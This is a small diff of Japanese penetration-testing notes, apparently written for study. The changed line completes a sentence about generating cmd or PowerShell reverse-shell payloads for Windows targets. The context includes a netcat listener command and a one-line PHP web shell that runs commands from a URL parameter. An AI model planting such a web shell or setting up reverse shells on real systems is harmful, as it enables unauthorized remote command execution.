@@ -80,7 +80,7 @@ sudo nc -lvnp 4444
 	- →シンプルなWebShellを用意：`<?php echo system($_GET["cmd"]); ?>`
 
 - PHPなどの言語固有のリバースシェルペイロードは、Unixベースのターゲット向けに書かれていることに注意
-	- これらは、デフォルトでは<u>Windowsで動作しない</u>ため、[Reverse Shell Generator](https://www.revshells.com/)でシェルをcmdやpo
+	- これらは、デフォルトでは<u>Windowsで動作しない</u>ため、[Reverse Shell Generator](https://www.revshells.com/)でシェルをcmdやpowershellでペイロードを生成する
 
 - Webアプリケーションにペイロードをアップロードできても、phpでは、`shell_exec`の無効化などにより、`?cmd=id`などが実行できないことがある→[[#トラブルシューティング]]
 
